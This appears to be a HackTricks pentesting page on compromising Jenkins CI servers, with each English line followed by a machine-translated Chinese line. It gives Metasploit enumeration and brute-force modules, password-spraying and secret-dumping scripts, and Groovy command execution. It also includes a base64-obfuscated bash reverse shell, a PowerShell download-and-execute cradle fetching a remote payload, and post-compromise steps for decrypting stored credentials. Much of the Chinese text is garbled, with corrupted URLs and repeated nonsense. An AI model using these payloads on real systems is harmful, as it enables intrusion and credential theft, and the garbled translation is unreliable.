# Jenkins

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>

<img src="../.gitbook/assets/image (307).png" alt="" data-size="original">

<img src =“ ../。gitbook/assets/image（307）.png“ alt =”“ data-size =“ ointern”>
Through Security Skills as a Service, we help organizations to **defend against the Dark Hacking Arts**. Security Skills as a Service is an offensive cybersecurity consultancy model that combines an Intelligent Platform with the top-class, globally distributed, offensive security engineers, delivering **high-quality penetration testing results. Security Hubs** bring together offensive penetration testing tactics with human behavioral science, providing real-time insights into threat actors' tradecraft and a **complete assessment of any risks**.

通过安全技能作为服务，我们帮助组织**防御黑暗黑客艺术**。 安全技能作为服务是一种进攻性网络安全咨询模型，将智能平台与顶级，全球分布式，进攻性安全工程师结合在一起，提供**高质量的渗透测试结果。 安全枢纽**将进攻性渗透测试策略与人类行为科学结合在一起，提供对威胁参与者贸易克罗夫特（Tradecraft）的实时见解，并对任何风险**进行完整评估。

{% embed url="https://securityhubs.io/" %}

## Basic Information

＃＃ 基本信息

Jenkins offers a simple way to set up a **continuous integration** or **continuous delivery** (CI/CD) environment for almost **any** combination of **languages** and source code repositories using pipelines, as well as automating other routine development tasks. While Jenkins doesn’t eliminate the **need to create scripts for individual steps**, it does give you a faster and more robust way to integrate your entire chain of build, test, and deployment tools than you can easily build yourself.\

詹金斯（Jenkins 并自动执行其他常规开发任务。 虽然詹金斯（Jenkins）并没有消除**需要为单个步骤创建脚本**，但它确实为您提供了整合整个构建，测试和部署工具的速度，更强大的方法，而不是您可以轻松地构建自己。
Definition from [here](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html).

定义来自[here]（https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explain.html）。

## Unauthenticated Enumeration

##未经身分的枚举

In order to search for interesting Jenkins pages without authentication like (_/people_ or _/asynchPeople_, this lists the current users) you can use:

为了搜索有趣的Jenkins页面，而无需认证（_/people_或_/asynchpeople_，这列出当前用户），您可以使用：

```
msf> use auxiliary/scanner/http/jenkins_enum
```

Check if you can execute commands without needing authentication:

检查是否可以执行命令而无需身份验证：

```
msf> use auxiliary/scanner/http/jenkins_command
```

Without credentials you can look inside _**/asynchPeople/**_ path or _**/securityRealm/user/admin/search/index?q=**_ for **usernames**.

没有凭据，您可以在_ **/asynchpeople/** _路径或_ **/securityRealm/user/admin/admin/search/index？q = ** _ for **用户名**中查看。

You may be able to get the Jenkins version from the path _**/oops**_ or _**/error**_

您也许可以从路径_ **/oops ** _或_ **/错误** _ _ _ _ _ _ _ _

![](<../.gitbook/assets/image (415).png>)

## Login

You will be able to find Jenkins instances that **allow you to create an account and login inside of it. As simple as that.**\

您将能够找到**允许您创建一个帐户并登录其内部的Jenkins实例。 就如此容易。**\
Also if **SSO** **functionality**/**plugins** were present then you should attempt to **log-in** to the application using a test account (i.e., a test **Github/Bitbucket account**). Trick from [**here**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

另外，如果** ** **功能**/**插件**，则应尝试使用测试帐户登录到应用程序（即测试** github/bitbucket帐户 **）。 从[**这里**]的技巧（https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/）。

### Bruteforce

**Jekins** does **not** implement any **password policy** or username **brute-force mitigation**. Then, you **should** always try to **brute-force** users because probably **weak passwords** are being used (even **usernames as passwords** or **reverse** usernames as passwords).

** jekins **做** ** **实施任何**密码策略**或用户名**蛮力缓解**。 然后，您**应该**始终尝试** brute-force **用户，因为可能**弱密码**正在使用（甚至**用户名作为密码**或** reververs **用户名作为密码）。

```
msf> use auxiliary/scanner/http/jenkins_login
```

## Jenkins Abuses

### Known Vulnerabilities

###已知漏洞

{% embed url="https://github.com/gquere/pwn_jenkins" %}

### Dumping builds to find cleartext secrets

###倾倒构建以查找ClearText Secrets

Use [this script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) to dump build console outputs and build environment variables to hopefully find cleartext secrets.

使用[此脚本]（https://github.com/gquere/pwn \_jenkins/blob/master/master/dump _builds/jenkins/jenkins/jenkins \ _dump_builds.pys.py）来转储构建控制台输出并构建环境变量 。

### Password spraying

Use [this python script](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) or [this powershell script](https://github.com/chryzsh/JenkinsPasswordSpray).

使用[此python脚本]（https://github.com/gquere/pwn \ _jenkins/blob/master/password/password \ _spraying/jenkins_passportword \ _spraying.py.py.py）或[powerShell脚本]（https：// github。 com/chryzsh/jenkinspasswordspray）。

### Decrypt Jenkins secrets offline

###解密詹金斯秘密离线

Use [this script](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) to decrypt previsously dumped secrets.

使用[此脚本]（https://github.com/gquere/pwn \ _jenkins/blob/master/master/offline/offline/_decryptimption/jenkins \ _offline \ _decrypt.py）在倾倒秘密。

### Decrypt Jenkins secrets from Groovy

###解密詹金斯的秘密

```
println(hudson.util.Secret.decrypt("{...}"))
```

<img src="../.gitbook/assets/image (307).png" alt="" data-size="original">

<img src =“ ../。gitbook/assets/image（307）.png“ alt =”“ data-size =“ ointern”>

Through Security Skills as a Service, we help organizations to **defend against the Dark Hacking Arts**. Security Skills as a Service is an offensive cybersecurity consultancy model that combines an Intelligent Platform with the top-class, globally distributed, offensive security engineers, delivering **high-quality penetration testing results. Security Hubs** bring together offensive penetration testing tactics with human behavioral science, providing real-time insights into threat actors' tradecraft and a **complete assessment of any risks**.

通过安全技能作为服务，我们帮助组织**防御黑暗黑客艺术**。 安全技能作为服务是一种进攻性网络安全咨询模型，将智能平台与顶级，全球分布式，进攻性安全工程师结合在一起，提供**高质量的渗透测试结果。 安全枢纽**将进攻性渗透测试策略与人类行为科学结合在一起，提供对威胁参与者贸易克罗夫特（Tradecraft）的实时见解，并对任何风险**进行完整评估。

{% embed url="https://securityhubs.io/" %}

## Code Execution

### **Create a new project**

### **创建一个新项目**

This method is very noisy because you have to create a hole new project (obviously this will only work if you user is allowed to create a new project).

此方法非常嘈杂，因为您必须创建一个新项目（显然，只有在允许您创建新项目的情况下，这才能起作用）。

1. Create a new project (Freestyle project)

1.创建一个新项目（自由泳项目）
2. Inside **Build** section set **Execute shell** and paste a powershell Empire launcher or a meterpreter powershell (can be obtained using _unicorn_). Start the payload with _PowerShell.exe_ instead using _powershell._

2.内部**构建**部分设置**执行外壳**并粘贴PowerShell Empire Launcher或MeterPreter PowerShell（可以使用_unicorn_获得）。 使用_powershell.exe _而不是使用_powershell._启动有效载荷。_
3. Click **Build now**

3.单击**立即构建**

Go to the projects and check **if you can configure any** of them (look for the "Configure button"):

转到项目并检查**如果您可以配置它们的任何**（查找“配置按钮”）：

![](<../.gitbook/assets/image (158) (1).png>)

Or **try to access to the path \_/configure**\_ in each project (example: /_me/my-views/view/all/job/Project0/configure_).

或**尝试访问每个项目中的路径\ _/configure ** \ _（示例：/_me/my-views/views/view/all/job/job/project0/configure_）。

If you are allowed to configure the project you can **make it execute commands when a build is successful**:

如果允许您配置项目，则可以在构建成功时**使其执行命令**：

![](<../.gitbook/assets/image (159) (1).png>)

Click on **Save** and **build** the project and your **command will be executed**.\

单击**保存**和**构建**项目和您的**命令将被执行**。
If you are not executing a reverse shell but a simple command you can **see the output of the command inside the output of the build**.

如果您不执行反向外壳，而是一个简单的命令，则可以**查看构建输出内部的命令的输出**。

### **Execute Groovy script**

Best way. Less noisy.

最好的办法。 不太嘈杂。

1. Go to _path\_jenkins/script_

1.转到路径\ jenkins/脚本
2. Inside the text box introduce the script

2.在文本框中介绍脚本

```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```

You could execute a command using: `cmd.exe /c dir`

您可以使用：`cmd.exe /c dir执行命令

In **linux** you can do: **`"ls /".execute().text`**

If you need to use _quotes_ and _single quotes_ inside the text. You can use _"""PAYLOAD"""_ (triple double quotes) to execute the payload.

如果您需要在文本中使用引号和单语引号。 您可以使用_“”“有效载荷”“ _（三重引号）来执行有效载荷。

**Another useful groovy script** is (replace \[INSERT COMMAND]):

**另一个有用的groovy脚本**是（替换\ [insert命令]）：

```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Reverse shell in linux

### Linux中的反向外壳

```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### Reverse shell in windows

### Windows中的反向外壳

You can prepare a HTTP server with a PS reverse shell and use Jeking to download and execute it:

您可以使用PS反向外壳准备HTTP服务器，并使用Jeking下载并执行它：

```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```

### MSF exploit

You can use MSF to get a reverse shell:

您可以使用MSF获得反向外壳：

```
msf> use exploit/multi/http/jenkins_script_console
```

## POST

### Metasploit

```
msf> post/multi/gather/jenkins_gather
```

### Files to copy after compromission

###折衷之后要复制的文件

These files are needed to decrypt Jenkins secrets:

需要这些文件来解密詹金斯的秘密：

* secrets/master.key

* Secrets/Master.key
* secrets/hudson.util.Secret

Such secrets can usually be found in:

这些秘密通常可以在：

* credentials.xml
* jobs/.../build.xml

*工作/.../ build.xml

Here's a regexp to find them:

这是找到它们的正直：

```
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
```

## References

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)

<img src="../.gitbook/assets/image (307).png" alt="" data-size="original">

<img src =“ ../。gitbook/assets/image（307）.png“ alt =”“ data-size =“ ointern”>

Through Security Skills as a Service, we help organizations to **defend against the Dark Hacking Arts**. Security Skills as a Service is an offensive cybersecurity consultancy model that combines an Intelligent Platform with the top-class, globally distributed, offensive security engineers, delivering **high-quality penetration testing results. Security Hubs** bring together offensive penetration testing tactics with human behavioral science, providing real-time insights into threat actors' tradecraft and a **complete assessment of any risks**.

通过安全技能作为服务，我们帮助组织**防御黑暗黑客艺术**。 安全技能作为服务是一种进攻性网络安全咨询模型，将智能平台与顶级，全球分布式，进攻性安全工程师结合在一起，提供**高质量的渗透测试结果。 安全枢纽**将进攻性渗透测试策略与人类行为科学结合在一起，提供对威胁参与者贸易克罗夫特（Tradecraft）的实时见解，并对任何风险**进行完整评估。

{% embed url="https://securityhubs.io/" %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>
